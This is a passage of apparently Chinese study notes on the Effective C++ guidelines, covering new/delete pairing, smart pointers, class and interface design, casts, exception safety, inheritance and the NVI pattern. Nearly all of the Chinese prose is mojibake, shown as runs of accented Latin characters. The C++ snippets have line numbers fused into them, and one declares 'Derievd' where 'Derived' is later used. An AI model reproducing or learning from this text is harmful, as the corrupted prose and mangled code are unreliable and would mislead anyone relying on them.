newçš„å‡½æ•°ï¼Œè§æ¡æ¬¾49å’Œæ¡æ¬¾51ï¼‰ã€‚ç¬¬äºŒï¼Œæ­¤å†…å­˜åŒºåŸŸä¼šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ„é€ å‡½æ•°è¢«è°ƒç”¨ã€‚ å½“ä½ ä½¿ç”¨ deleteï¼Œä¹Ÿæœ‰ä¸¤ä»¶äº‹å‘ç”Ÿï¼šç¬¬ä¸€ï¼Œèµ„æºå†…å­˜ä¼šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªææ„å‡½æ•°è¢«è°ƒç”¨ï¼›ç¬¬äºŒï¼Œå†…å­˜æ‰è¢«é‡Šæ”¾ï¼ˆé€šè¿‡åä¸ºoperator deleteçš„å‡½æ•°ï¼Œè§æ¡æ¬¾51ï¼‰ã€‚ å¦‚æœä½ åœ¨newè¡¨è¾¾å¼ä¸­ä½¿ç”¨[]ï¼Œå¿…é¡»åœ¨ç›¸åº”çš„deleteè¡¨è¾¾å¼ä¸­ä¹Ÿä½¿ç”¨[]ã€‚å¦‚æœä½ åœ¨newè¡¨è¾¾å¼ä¸­ä¸ä½¿ç”¨[]ï¼Œä¸€å®šä¸è¦åœ¨ç›¸åº”çš„deleteè¡¨è¾¾å¼ä¸­ä½¿ç”¨[]ã€‚ 12345678910string* p1 = new string;delete p1;string* p2 = new string[10];delete[] p2;typedef string Def[3];string* p3 = new Def;delete[] p3; æ¡æ¬¾17ï¼šä»¥ç‹¬ç«‹è¯­å¥å°†newedå¯¹è±¡ç½®å…¥æ™ºèƒ½æŒ‡é’ˆ ç†ç”±æ˜¯C++ç¼–è¯‘å™¨å¤„ç†äº‹ä»¶é¡ºåºçš„ä¸ç¡®å®šæ€§ã€‚ æ¯”å¦‚ï¼Œprocessä¼ å…¥Widgetçš„ptrï¼Œå’Œä¸€ä¸ªpriority()å‡½æ•°ï¼š 1process(std::shared_ptr&lt;Widget&gt;(new Widget), priority()); æ‰§è¡Œé¡ºåºä¸­ï¼Œåœ¨ new å’Œ shared_ptr æ„é€ å‡½æ•°æ‰§è¡Œæ—¶ï¼Œpriority()çš„æ‰§è¡Œå‡ºç°å¼‚å¸¸ï¼Œé‚£ä¹ˆnewçš„å¯¹è±¡å¯èƒ½å¯¼è‡´èµ„æºæ³„éœ²ã€‚ ä»¥ç‹¬ç«‹è¯­å¥å°† newedå¯¹è±¡å­˜å‚¨äºï¼ˆç½®å…¥ï¼‰æ™ºèƒ½æŒ‡é’ˆå†…ã€‚æ­£ç¡®æ–¹æ³•ï¼š 1234// 1std::shared_ptr&lt;Widget&gt; pw(new Widget);// 2process(pw, priority()); å››ã€è®¾è®¡ä¸å£°æ˜ æ¡æ¬¾18ï¼šè®©æ¥å£å®¹æ˜“è¢«æ­£ç¡®ä½¿ç”¨ï¼Œä¸æ˜“è¢«è¯¯ç”¨ â€œä¿ƒè¿›æ­£ç¡®ä½¿ç”¨â€çš„åŠæ³•åŒ…æ‹¬ï¼šæ¥å£çš„ä¸€è‡´æ€§ï¼Œä¸å†…ç½®ç±»å‹çš„è¡Œä¸ºå…¼å®¹ã€‚ â€œé˜»æ­¢è¯¯ç”¨â€çš„åŠæ³•åŒ…æ‹¬ï¼šå»ºç«‹æ–°ç±»å‹æ—¶é™åˆ¶ç±»å‹ä¸Šçš„ä¸å¿…è¦æ“ä½œï¼Œä¸è®©ä½¿ç”¨è€…è´Ÿè´£èµ„æºç®¡ç†ã€‚ std::shared_ptr æ”¯æŒå®šåˆ¶ custom deleterã€‚å¯è¢«ç”¨æ¥è‡ªåŠ¨è§£é™¤äº’æ–¥é”ï¼ˆmutexesï¼›è§æ¡æ¬¾14ï¼‰ã€‚ æ¡æ¬¾19ï¼šè®¾è®¡classçŠ¹å¦‚è®¾è®¡type è®¾è®¡é«˜æ•ˆçš„classeså¿…é¡»äº†è§£ä½ é¢å¯¹çš„é—®é¢˜ï¼š çœŸçš„éœ€è¦ä¸€ä¸ªæ–°typeå—ï¼Ÿå¦‚æœåªæ˜¯ä¸ºæ—¢æœ‰çš„classæ·»åŠ ä¸€äº›åŠŸèƒ½ï¼Œæ˜¯å¦å•çº¯å®šä¹‰ä¸€æˆ–å¤šä¸ªnon-memberå‡½æ•°æˆ–templatesï¼Œå°±èƒ½å¤Ÿè¾¾åˆ°ç›®çš„ï¼Ÿã€‚ æ–°typeçš„å¯¹è±¡åº”è¯¥å¦‚ä½•è¢«åˆ›å»ºå’Œé”€æ¯ï¼Ÿå³classçš„æ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€å†…å­˜åˆ†é…å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ï¼ˆoperator newï¼Œoperator new[]ï¼Œoperator deleteå’Œoperator delete[]ï¼‰çš„è®¾è®¡ã€‚ å¯¹è±¡çš„åˆå§‹åŒ–å’Œå¯¹è±¡çš„èµ‹å€¼æœ‰ä»€ä¹ˆæ ·çš„å·®åˆ«ï¼Ÿè¿™å†³å®šäº†æ„é€ å‡½æ•°å’Œèµ‹å€¼æ“ä½œç¬¦ï¼ˆoperator=ï¼‰çš„è¡Œä¸ºå·®å¼‚ã€‚åˆ«æ··æ·†äº†â€œåˆå§‹åŒ–â€å’Œâ€œèµ‹å€¼â€ã€‚ æ–°typeçš„å¯¹è±¡å¦‚ä½•è¢«passed by valueï¼Ÿå³å¦‚ä½•è®¾è®¡copy constructorã€‚ è€ƒè™‘typeæˆå‘˜å˜é‡çš„å–å€¼åˆæ³•èŒƒå›´ã€‚ æ–°type çš„ç»§æ‰¿å…³ç³»å¦‚ä½•ï¼Ÿæ˜¯å¦ç»§æ‰¿è‡ªè™šåŸºç±»ï¼Œæ˜¯å¦ä¼šè¢«æ–°å­ç±»ç»§æ‰¿ï¼Œææ„å‡½æ•°æ˜¯å¦éœ€è¦ä¸ºvirtualï¼Ÿã€‚ æ–°typeéœ€è¦ä»€ä¹ˆæ ·çš„ç±»å‹è½¬æ¢ï¼Ÿè‹¥å…è®¸ç±»å‹ T1 è¢«éšå¼è½¬æ¢ä¸ºT2ï¼Œå°±å¿…é¡»åœ¨ class T1 å†…å†™ä¸€ä¸ªç±»å‹è½¬æ¢æ“ä½œç¬¦ï¼ˆoperator T2ï¼‰æˆ–åœ¨ class T2 å†…å†™ä¸€ä¸ª non-explicit-one-argument çš„æ„é€ å‡½æ•°ï¼ˆå³ï¼ŒCtor(int arg1, int arg2=1):m_arg1(arg1),m_arg2(arg2) {}ï¼‰ã€‚å¦‚æœä½ åªå…è®¸ explicit æ„é€ å‡½æ•°å­˜åœ¨ï¼Œå°±å¾—å†™å‡ºä¸“é—¨è´Ÿè´£æ‰§è¡Œè½¬æ¢çš„æ„é€ å‡½æ•°ï¼Œä¸”ä¸èƒ½æ˜¯ç±»å‹è½¬æ¢æ“ä½œç¬¦ï¼ˆtype conversion operators, å³operator T2ï¼‰æˆ– non-explicit-one-argument æ„é€ å‡½æ•°ã€‚ ä»€ä¹ˆæ ·çš„æ“ä½œç¬¦å’Œå‡½æ•°å¯¹æ­¤æ–° type è€Œè¨€æ˜¯åˆç†çš„ï¼Ÿå³ï¼Œéœ€è¦ä¸ºclasså£°æ˜å“ªäº›memberå‡½æ•°ï¼Œå“ªäº›å¤–éƒ¨å…¨å±€å‡½æ•°ã€‚ å“ªä¸ªæˆå‘˜ä¸º publicï¼Œå“ªä¸ªä¸ºprotectedï¼Œå“ªä¸ªä¸º privateï¼Œå“ªä¸€ä¸ª classes å’Œ/æˆ– functions åº”è¯¥æ˜¯friendsï¼Ÿ æ–°typeæœ‰æ˜¯å¦éœ€è¦æ˜¯ä¸ªclass templateï¼Ÿã€‚ æ¡æ¬¾20ï¼šå®ä»¥pass by reference to constæ›¿æ¢pass by value é»˜è®¤æƒ…å†µä¸‹C++ä»¥pass by valueæ–¹å¼ï¼ˆä¸€ä¸ªç»§æ‰¿è‡ªCçš„æ–¹å¼ï¼‰ä¼ é€’å¯¹è±¡è‡³å‡½æ•°ã€‚é»˜è®¤å‡½æ•°å‚æ•°éƒ½æ˜¯ä»¥å®å‚çš„å‰¯æœ¬ä¸ºåˆå€¼ï¼Œè€Œè°ƒç”¨ç«¯æ‰€è·å¾—çš„ä¹Ÿæ˜¯å‡½æ•°è¿”å›å€¼çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œç”±å¯¹è±¡çš„copy æ„é€ å‡½æ•°ç”Ÿæˆï¼Œè¿™å¯èƒ½ä½¿å¾—pass by valueæˆä¸ºè´¹æ—¶çš„æ“ä½œã€‚ pass by reference to constè¿™ç§ä¼ é€’æ–¹å¼ï¼Œæ²¡æœ‰ä»»ä½•æ„é€ å‡½æ•°æˆ–ææ„å‡½æ•°è¢«è°ƒç”¨ï¼Œå› ä¸ºæ²¡æœ‰ä»»ä½•æ–°å¯¹è±¡è¢«åˆ›å»ºã€‚ ä»¥by referenceæ–¹å¼ä¼ é€’å‚æ•°ä¹Ÿå¯ä»¥é¿å…slicingï¼ˆå¯¹è±¡åˆ‡å‰²ï¼‰é—®é¢˜ã€‚å½“ä¸€ä¸ªderived classå¯¹è±¡ä»¥by valueæ–¹å¼ä¼ é€’å¹¶è¢«è§†ä¸ºä¸€ä¸ªbase classå¯¹è±¡ï¼Œbase classçš„copyæ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè€Œæ²¡æœ‰åˆå§‹åŒ–derived classçš„éƒ¨åˆ†ã€‚ å°½é‡ä»¥pass-by-reference-to-constæ›¿æ¢pass-by-valueã€‚å‰è€…é€šå¸¸æ¯”è¾ƒé«˜æ•ˆï¼Œå¹¶å¯é¿å…åˆ‡å‰²é—®é¢˜ï¼ˆslicing problemï¼‰ã€‚ ä»¥ä¸Šè§„åˆ™å¹¶ä¸é€‚ç”¨äºå†…ç½®ç±»å‹ï¼Œä»¥åŠ STL çš„è¿­ä»£å™¨å’Œå‡½æ•°å¯¹è±¡ã€‚å¯¹å®ƒä»¬è€Œè¨€ï¼Œpass-by-valueå¾€å¾€æ¯”è¾ƒé€‚å½“ã€‚STLçš„è¿­ä»£å™¨å’Œå‡½æ•°æ˜¯åŸºäºCæŒ‡é’ˆå®ç°çš„ã€‚ æ¡æ¬¾21ï¼šå¿…é¡»è¿”å›å¯¹è±¡æ—¶ï¼Œåˆ«è¿”å›å…¶reference ç»å¯¹ä¸è¦è¿”å›pointeræˆ–referenceæŒ‡å‘ä¸€ä¸ªlocal stackå¯¹è±¡ ç»å¯¹ä¸è¦è¿”å›referenceæŒ‡å‘ä¸€ä¸ªheap-allocatedå¯¹è±¡ æ¡æ¬¾22ï¼šå°†æˆå‘˜å˜é‡å£°æ˜ä¸ºprivate ä»å°è£…çš„è§’åº¦è§‚ä¹‹ï¼Œå…¶å®åªæœ‰ä¸¤ç§è®¿é—®æƒé™ï¼šprivateï¼ˆæä¾›å°è£…ï¼‰å’Œå…¶ä»–ï¼ˆä¸æä¾›å°è£…ï¼‰ã€‚ åˆ‡è®°å°†æˆå‘˜å˜é‡å£°æ˜ä¸ºprivateã€‚ protectedå¹¶ä¸æ¯”publicæ›´å…·å°è£…æ€§ã€‚ æ¡æ¬¾23ï¼šå®ä»¥non-memberã€non-friendæ›¿æ¢memberå‡½æ•° å®å¯æ‹¿non-memberã€non-friendå‡½æ•°æ›¿æ¢memberå‡½æ•°ã€‚è¿™æ ·åšå¯ä»¥å¢åŠ å°è£…æ€§ã€åŒ…è£…å¼¹æ€§ï¼ˆpackaging flexibilityï¼‰å’Œå¯æ‰©å±•æ€§ã€‚ æ¡æ¬¾24ï¼šè‹¥æ‰€æœ‰å‚æ•°çš†éœ€ç±»å‹è½¬æ¢ï¼Œè¯·ä¸ºæ­¤é‡‡ç”¨non-memberå‡½æ•° å¦‚æœä½ éœ€è¦ä¸ºæŸä¸ªæˆå‘˜å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼ˆåŒ…æ‹¬thisæŒ‡é’ˆå‚æ•°ï¼‰è¿›è¡Œç±»å‹è½¬æ¢ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å¿…é¡»æ˜¯ä¸ªnon-memberã€‚const T operator*(const T&amp; lhs, const T&amp; rhs) ã€‚ æ¡æ¬¾25ï¼šè€ƒè™‘å†™å‡ºä¸€ä¸ªä¸æŠ›å¼‚å¸¸çš„swapå‡½æ•° å½“std::swapå¯¹ä½ çš„ç±»å‹æ•ˆç‡ä¸é«˜æ—¶ï¼Œæä¾›ä¸€ä¸ªswapæˆå‘˜å‡½æ•°ï¼Œå¹¶ç¡®å®šè¿™ä¸ªå‡½æ•°ä¸æŠ›å‡ºå¼‚å¸¸ã€‚ å¦‚æœä½ æä¾›ä¸€ä¸ªmember swapï¼Œä¹Ÿè¯¥æä¾›ä¸€ä¸ªnon-member swapç”¨æ¥è°ƒç”¨å‰è€…ã€‚ è°ƒç”¨swapæ—¶åº”é’ˆå¯¹std::swapä½¿ç”¨usingå£°æ˜å¼ï¼Œç„¶åè°ƒç”¨swapå¹¶ä¸”ä¸å¸¦ä»»ä½•â€œå‘½åç©ºé—´èµ„æ ¼ä¿®é¥°â€ã€‚ ä¸ºâ€œç”¨æˆ·å®šä¹‰ç±»å‹â€è¿›è¡Œstd templateså…¨ç‰¹åŒ–æ˜¯å¥½çš„ï¼Œä½†åƒä¸‡ä¸è¦æ›´æ”¹std::swapåŸæ¥çš„å®ç°ã€‚ äº”ã€å®ç° æ¡æ¬¾26ï¼šå°½å¯èƒ½å»¶åå˜é‡å®šä¹‰å¼çš„å‡ºç°æ—¶é—´ å°½å¯èƒ½å»¶åå˜é‡å®šä¹‰å¼çš„å‡ºç°ï¼Œå°½å¯èƒ½åœ¨ä½¿ç”¨å˜é‡å‰å®šä¹‰å˜é‡ï¼Œå°½å¯èƒ½åœ¨å˜é‡èµ‹åˆå€¼æ—¶å®šä¹‰å˜é‡ã€‚è¿™æ ·åšå¯å¢åŠ ç¨‹åºçš„æ¸…æ™°åº¦å¹¶æ”¹å–„ç¨‹åºæ•ˆç‡ã€‚ æ¡æ¬¾27ï¼šå°½é‡å°‘åšè½¬å‹åŠ¨ä½œ const_cast é€šå¸¸è¢«ç”¨æ¥å°†å¯¹è±¡çš„å¸¸é‡æ€§è½¬é™¤ï¼ˆcast away the constnessï¼‰ã€‚å®ƒä¹Ÿæ˜¯å”¯ä¸€æœ‰æ­¤èƒ½åŠ›çš„C++-styleè½¬å‹æ“ä½œç¬¦ã€‚ dynamic_cast ä¸»è¦ç”¨æ¥æ‰§è¡Œâ€œå®‰å…¨å‘ä¸‹è½¬å‹â€ï¼ˆsafe downcastingï¼‰ï¼Œä¹Ÿå°±æ˜¯ç”¨æ¥å†³å®šæŸå¯¹è±¡æ˜¯å¦å½’å±ç»§æ‰¿ä½“ç³»ä¸­çš„æŸä¸ªç±»å‹ã€‚å®ƒæ˜¯å”¯ä¸€å¯èƒ½è€—è´¹é‡å¤§è¿è¡Œæˆæœ¬çš„è½¬å‹åŠ¨ä½œã€‚ reinterpret_cast æ„å›¾æ‰§è¡Œä½çº§è½¬å‹ï¼Œå®é™…è¿è¡Œæƒ…å†µå–å†³äºç¼–è¯‘å™¨ï¼Œè¿™ä¹Ÿå°±è¡¨ç¤ºå®ƒä¸å¯ç§»æ¤ã€‚ä¾‹å¦‚å°†ä¸€ä¸ªpointer to intè½¬å‹ä¸ºä¸€ä¸ªintã€‚ static_cast ç”¨æ¥å¼ºè¿«éšå¼è½¬æ¢ï¼ˆimplicit conversionsï¼‰ï¼Œä¾‹å¦‚å°†non-const å¯¹è±¡è½¬ä¸º const å¯¹è±¡ï¼ˆæ¡æ¬¾3ï¼‰ï¼Œæˆ–å°† int è½¬ä¸º double ç­‰ç­‰ã€‚å°† void* æŒ‡é’ˆè½¬ä¸ºæŸç±»å‹ typed æŒ‡é’ˆï¼Œå°†pointer-to-baseè½¬ä¸ºpointer-to-derivedã€‚ä½†å®ƒæ— æ³•å°†constè½¬ä¸ºnon-constâ€”â€”è¿™ä¸ªåªæœ‰const_castæ‰åŠå¾—åˆ°ã€‚ è¯·è®°ä½ï¼š å¦‚æœå¯ä»¥ï¼Œå°½é‡é¿å…è½¬å‹ï¼Œç‰¹åˆ«æ˜¯åœ¨æ³¨é‡æ•ˆç‡çš„ä»£ç ä¸­é¿å… dynamic_castsã€‚å¦‚æœæœ‰ä¸ªè®¾è®¡éœ€è¦è½¬å‹åŠ¨ä½œï¼Œè¯•ç€å‘å±•æ— éœ€è½¬å‹çš„æ›¿ä»£è®¾è®¡ã€‚ å¦‚æœè½¬å‹æ˜¯å¿…è¦çš„ï¼Œè¯•ç€å°†å®ƒåŒ…è£…æˆæŸä¸ªå‡½æ•°ã€‚å®¢æˆ·éšåå¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œè€Œä¸éœ€å°†è½¬å‹æ”¾è¿›ä»–ä»¬è‡ªå·±çš„ä»£ç å†…ã€‚ å®å¯ä½¿ç”¨C++-styleï¼ˆæ–°å¼ï¼‰è½¬å‹ï¼Œä¸è¦ä½¿ç”¨æ—§å¼è½¬å‹ã€‚ æ¡æ¬¾28ï¼šé¿å…è¿”å›handlesæŒ‡å‘å¯¹è±¡å†…éƒ¨æˆåˆ† å¦‚æœconstæˆå‘˜å‡½æ•°ä¼ å‡ºä¸€ä¸ªreferenceæŒ‡å‘æˆå‘˜å˜é‡ï¼Œå‡½æ•°è¿è¡Œç»“æœåˆè¢«å­˜å‚¨äºå¯¹è±¡å¤–éƒ¨ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„è°ƒç”¨è€…å°±å¯ä»¥é€šè¿‡referenceä¿®æ”¹å¯¹è±¡çš„å†…éƒ¨æˆå‘˜ã€‚ é¿å…è¿”å›handlesï¼ˆåŒ…æ‹¬referencesã€æŒ‡é’ˆã€è¿­ä»£å™¨ï¼‰æŒ‡å‘å¯¹è±¡å†…éƒ¨ã€‚éµå®ˆè¿™ä¸ªæ¡æ¬¾å¯å¢åŠ å°è£…æ€§ï¼Œå¸®åŠ© const æˆå‘˜å‡½æ•°çš„è¡Œä¸ºåƒä¸ª constï¼Œå¹¶å°†å‘ç”Ÿ dangling handles çš„å¯èƒ½æ€§é™è‡³æœ€ä½ã€‚ æ¡æ¬¾29ï¼šä¸ºâ€œå¼‚å¸¸å®‰å…¨â€è€ŒåŠªåŠ›æ˜¯å€¼å¾—çš„ å¼‚å¸¸å®‰å…¨å‡½æ•°ï¼ˆException-safe functionsï¼‰æä¾›ä»¥ä¸‹ä¸‰ä¸ªä¿è¯ä¹‹ä¸€ï¼š åŸºæœ¬å‹ä¿è¯ï¼šå¦‚æœå¼‚å¸¸è¢«æŠ›å‡ºï¼Œç¨‹åºå†…çš„ä»»ä½•äº‹ç‰©ä»ç„¶ä¿æŒåœ¨æœ‰æ•ˆçŠ¶æ€ä¸‹ã€‚ å¼ºçƒˆå‹ä¿è¯ï¼šå¦‚æœå¼‚å¸¸è¢«æŠ›å‡ºï¼Œç¨‹åºçŠ¶æ€ä¸æ”¹å˜ã€‚å¦‚æœå‡½æ•°æˆåŠŸï¼Œå°±æ²¡æœ‰å¼‚å¸¸å‡ºç°ï¼›å¦‚æœå‡½æ•°å¤±è´¥ï¼Œç¨‹åºä¼šå›é€€åˆ°â€œè°ƒç”¨å‡½æ•°ä¹‹å‰â€çš„çŠ¶æ€ã€‚ ä¸æŠ›æ·ï¼ˆnothrowï¼‰ä¿è¯ï¼šæ‰¿è¯ºç»ä¸æŠ›å‡ºå¼‚å¸¸ï¼Œå› ä¸ºå®ƒä»¬æ€»æ˜¯èƒ½å¤Ÿå®Œæˆå®ƒä»¬å…¶è®¾è®¡çš„åŠŸèƒ½ã€‚ å¼‚å¸¸å®‰å…¨ç ï¼ˆException-safe codeï¼‰å¿…é¡»æä¾›ä¸Šè¿°ä¸‰ç§ä¿è¯ä¹‹ä¸€ã€‚å¦‚æœå®ƒä¸è¿™æ ·åšï¼Œå®ƒå°±ä¸å…·å¤‡å¼‚å¸¸å®‰å…¨æ€§ã€‚ å¼ºçƒˆå‹å¼‚å¸¸å®‰å…¨çš„ä¸€ç§å®è·µï¼šcopy and swapã€‚åŸåˆ™å¾ˆç®€å•ï¼šä¸ºä½ æ‰“ç®—ä¿®æ”¹çš„å¯¹è±¡åšå‡ºä¸€ä»½å‰¯æœ¬ï¼Œç„¶åå¯¹å‰¯æœ¬åšä¸€åˆ‡å¿…è¦ä¿®æ”¹ã€‚è‹¥æœ‰ä»»ä½•ä¿®æ”¹åŠ¨ä½œæŠ›å‡ºå¼‚å¸¸ï¼ŒåŸå¯¹è±¡ä»ä¿æŒæœªæ”¹å˜çŠ¶æ€ã€‚å¾…æ‰€æœ‰æ”¹å˜éƒ½æˆåŠŸåï¼Œå†å°†å‰¯æœ¬å’ŒåŸå¯¹è±¡åœ¨ä¸€ä¸ªä¸æŠ›å‡ºå¼‚å¸¸çš„æ“ä½œä¸­ç½®æ¢ï¼ˆswapï¼‰ã€‚ å¼‚å¸¸å®‰å…¨å‡½æ•°ï¼ˆException-safe functionsï¼‰å³ä½¿å‘ç”Ÿå¼‚å¸¸ä¹Ÿä¸ä¼šæ³„æ¼èµ„æºæˆ–å…è®¸ä»»ä½•æ•°æ®ç»“æ„è´¥åã€‚ â€œå¼ºçƒˆä¿è¯â€å¾€å¾€èƒ½å¤Ÿä»¥ copy-and-swap å®ç°å‡ºæ¥ï¼Œä½†â€œå¼ºçƒˆä¿è¯â€å¹¶éå¯¹æ‰€æœ‰å‡½æ•°éƒ½å¯å®ç°æˆ–å…·å¤‡ç°å®æ„ä¹‰ã€‚ æ¡æ¬¾30ï¼šé€å½»äº†è§£inlineçš„é‡Œé‡Œå¤–å¤– å°†inlineé™åˆ¶åœ¨å°å‹ã€è¢«é¢‘ç¹è°ƒç”¨çš„å‡½æ•°èº«ä¸Šã€‚è¿™å¯ä½¿æ—¥åçš„è°ƒè¯•è¿‡ç¨‹å’ŒäºŒè¿›åˆ¶å‡çº§ï¼ˆbinary upgradabilityï¼‰æ›´å®¹æ˜“ï¼Œä¹Ÿå¯ä½¿æ½œåœ¨çš„ä»£ç è†¨èƒ€é—®é¢˜æœ€å°åŒ–ï¼Œä½¿ç¨‹åºçš„é€Ÿåº¦æå‡æœºä¼šæœ€å¤§åŒ–ã€‚ ä¸è¦åªå› ä¸ºfunction templateså‡ºç°åœ¨å¤´æ–‡ä»¶ï¼Œå°±å°†å®ƒä»¬å£°æ˜ä¸ºinlineã€‚ !!! important!!!: ç°ä»£Cã€C++ç¼–è¯‘å™¨ï¼Œä¼šè‡ªåŠ¨ä¼˜åŒ–ä»£ç ï¼Œç¨‹åºä¸­ inline å·²ç»åªç®—æ˜¯ä¸€ç§æç¤ºç¬¦ï¼Œå¹¶ä¸å…·å¤‡ç¼–è¯‘å±‚é¢ä¸Šçš„ç»å¯¹å«ä¹‰ã€‚æ‰€ä»¥ï¼Œå¿˜äº†å®ƒä¹Ÿæ— å¦¨ã€‚ æ¡æ¬¾31ï¼šå°†æ–‡ä»¶é—´çš„ç¼–è¯‘ä¾å­˜å…³ç³»é™è‡³æœ€ä½ æ”¯æŒâ€œç¼–è¯‘ä¾å­˜æ€§æœ€å°åŒ–â€çš„ä¸€èˆ¬æ„æƒ³æ˜¯ï¼šä¾èµ–å£°æ˜ï¼Œä¸è¦ä¾èµ–å®šä¹‰ã€‚ ç¨‹åºåº“å¤´æ–‡ä»¶åº”è¯¥ä»¥â€œå®Œå…¨ä¸”ä»…æœ‰å£°æ˜å¼â€ï¼ˆfull and declaration-onlyformsï¼‰çš„å½¢å¼å­˜åœ¨ã€‚è¿™ç§åšæ³•ä¸è®ºæ˜¯å¦æ¶‰åŠtemplateséƒ½é€‚ç”¨ã€‚ å…­ã€ç»§æ‰¿ä¸é¢å‘å¯¹è±¡è®¾è®¡ æ¡æ¬¾32ï¼šç¡®å®šä½ çš„publicç»§æ‰¿å¡‘æ¨¡å‡ºis-aå…³ç³» public inheritance æ„å‘³ \"is-a\" çš„å…³ç³»ã€‚é€‚ç”¨äºbase classesèº«ä¸Šçš„æ¯ä¸€ä»¶äº‹æƒ…ä¸€å®šä¹Ÿé€‚ç”¨äºderived classesèº«ä¸Šï¼Œå› ä¸ºæ¯ä¸€ä¸ªderived classå¯¹è±¡ä¹Ÿéƒ½æ˜¯ä¸€ä¸ªbase classå¯¹è±¡ã€‚ æ¡æ¬¾33ï¼šé¿å…è¦†ç›–ç»§æ‰¿è€Œæ¥çš„åç§° ä¸ºäº†è®©è¢«é®æ©çš„åç§°å†è§å¤©æ—¥ï¼Œå¯ä½¿ç”¨ using å£°æ˜å¼æˆ–è½¬äº¤å‡½æ•°ï¼ˆforwarding functionsï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435class Base &#123; int x;public: virtual void f1() = 0; virtual void f1(int); virtual void f2(); void f3(); void f3(double); virtual void f5(); ...&#125;;class Derievd: public Base &#123;public: using Base::f1; using Base::f3; virtual void f1(); void f3(); void f4(); // fowarding function virtual void f5() &#123; Base::f5(); &#125; ...&#125;;Derived d;int x = 1;d.f1(); // Derived::f1d.f1(x); // Base::f1d.f2(); // Base::f2d.f3(); // Derived::f3d.f3(x); // Base::f3d.f4(); // Derived::f4d.f5(); // Derived::f5, è½¬åˆ°Base::f5() æ¡æ¬¾34ï¼šåŒºåˆ†æ¥å£ç»§æ‰¿å’Œå®ç°ç»§æ‰¿ å‡½æ•°æ¥å£ï¼ˆfunction interfacesï¼‰ç»§æ‰¿å’Œå‡½æ•°å®ç°ï¼ˆfunctionimplementationsï¼‰ç»§æ‰¿ã€‚ å£°æ˜ä¸€ä¸ªpure virtualå‡½æ•°çš„ç›®çš„æ˜¯ä¸ºäº†è®©derived classesåªç»§æ‰¿å‡½æ•°æ¥å£ã€‚ å£°æ˜ç®€æœ´çš„ï¼ˆéçº¯ï¼‰impure virtualå‡½æ•°çš„ç›®çš„ï¼Œæ˜¯è®©derived classesç»§æ‰¿è¯¥å‡½æ•°çš„æ¥å£å’Œç¼ºçœå®ç°ï¼Œå¿…è¦æƒ…å†µä¸‹ï¼Œç¼ºçœå®ç°å¯ä»¥å•ç‹¬è®¾è®¡ä¸ºä¸€ä¸ªæˆå‘˜å‡½æ•°ï¼Œè€Œæ¥å£è®¾è®¡ä¸ºpure virtualå‡½æ•°ï¼Œé˜²æ­¢ç¼ºçœå®ç°è¢«è¯¯ç”¨ã€‚ å£°æ˜non-virtualå‡½æ•°çš„ç›®çš„æ˜¯ä¸ºäº†ä»¤derived classesç»§æ‰¿å‡½æ•°çš„æ¥å£åŠä¸€ä»½å¼ºåˆ¶æ€§å®ç°ï¼Œæ¯”å¦‚è®¾è®¡æ¯ä¸ªå¯¹è±¡éƒ½ç›¸åŒä¸”å¿…è¦çš„IDç”Ÿæˆæ–¹æ³•ã€‚ æ¡æ¬¾35ï¼šè€ƒè™‘virtualå‡½æ•°ä»¥å¤–çš„å…¶ä»–é€‰æ‹© virtualå‡½æ•°çš„æ›¿ä»£æ–¹æ¡ˆåŒ…æ‹¬ NVI(Non-Virtual Interface) æ‰‹æ³•åŠStrategyè®¾è®¡æ¨¡å¼çš„å¤šç§å½¢å¼ã€‚NVIæ‰‹æ³•è‡ªèº«æ˜¯ä¸€ä¸ªç‰¹æ®Šå½¢å¼çš„Template Methodè®¾è®¡æ¨¡å¼ã€‚ 1234567891011121314// NVI(Non-Virtual Interface) class A &#123;public: int score() const &#123; // non-virtual, å­ç±»ä¸é‡è½½ ... int val = doScore(); ... return val; &#125;private: virtual int doScore() const &#123; // å­ç±»é‡è½½ ... &#125;&#125;; å°†åŠŸèƒ½ä»æˆå‘˜å‡½æ•°ç§»åˆ°classå¤–éƒ¨å‡½æ•°ï¼Œå¸¦æ¥çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯ï¼Œéæˆå‘˜å‡½æ•°æ— æ³•è®¿é—®classçš„non-publicæˆå‘˜ã€‚ std::function å¯¹è±¡çš„è¡Œä¸ºå°±åƒä¸€èˆ¬å‡½æ•°æŒ‡é’ˆã€‚è¿™æ ·çš„å¯¹è±¡å¯æ¥çº³ï¼Œå‡½æ•°ç­¾åï¼ˆtarget signatureï¼‰ä¸€è‡´çš„æ‰€æœ‰å¯è°ƒç”¨å¯¹è±¡ï¼ˆcallable entitiesï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132// declareclass Person;int defaultLearnStrategy(const Person&amp; pp);// definationclass Person &#123;public: typedef std::function&lt;int(const Person&amp;)&gt; learnStrat; explicit Person(learnStrat lst=defaultLearnStrategy): stratFunc(lst) &#123; ... &#125; int score() const &#123; return stratFunc(*this); &#125;private: learnStrat stratFunc;&#125;;int readStrategy(const Person&amp;) &#123; ...&#125;;int writeStrategy(const Person&amp;) &#123; ...&#125;;...Person p1(readStrategy);Person p2(writeStrategy);int score1 = p1.score();int score2 = p2.score(); æ¡æ¬¾36ï¼šç»ä¸é‡æ–°å®šä¹‰ç»§æ‰¿è€Œæ¥çš„non-virtualå‡½æ•° ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸è¯¥é‡æ–°å®šä¹‰ä¸€ä¸ªç»§æ‰¿è€Œæ¥çš„non-virtualå‡½æ•°ã€‚ æ¡æ¬¾37ï¼šç»ä¸é‡æ–°å®šä¹‰ç»§æ‰¿è€Œæ¥çš„ç¼ºçœå‚æ•°å€¼ ç»å¯¹ä¸è¦é‡æ–°å®šä¹‰ä¸€ä¸ªç»§æ‰¿è€Œæ¥çš„virtualæˆå‘˜å‡½æ•°ç¼ºçœå‚æ•°å€¼ï¼Œå› ä¸ºç¼ºçœå‚æ•°å€¼éƒ½æ˜¯é™æ€ç»‘å®šï¼ˆstatically 